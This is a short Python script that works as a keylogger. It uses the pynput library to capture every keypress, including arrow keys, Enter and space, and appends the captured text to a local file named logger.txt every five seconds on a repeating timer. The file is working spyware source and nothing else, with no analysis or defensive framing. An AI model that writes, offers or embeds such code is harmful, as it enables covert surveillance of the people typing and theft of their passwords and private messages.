import threading

import pynput.keyboard

keys = ""


def process_keys(key):
    global keys
    try:
        keys = keys+str(key.char)
    except AttributeError:
        # if key == key.backspace:
        #     keys=keys[:-1]
        if key in [key.right, key.left, key.up, key.down, key.enter]:
            keys=keys+"\n"
        elif key==key.space:
            keys=keys+" "

def report():
    global keys
    fin = open("logger.txt", "a")
    fin.write(keys)
    keys=""
    fin.close()
    timer=threading.Timer(5, report)
    timer.start()

def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        report()
        keyboard_listener.join()
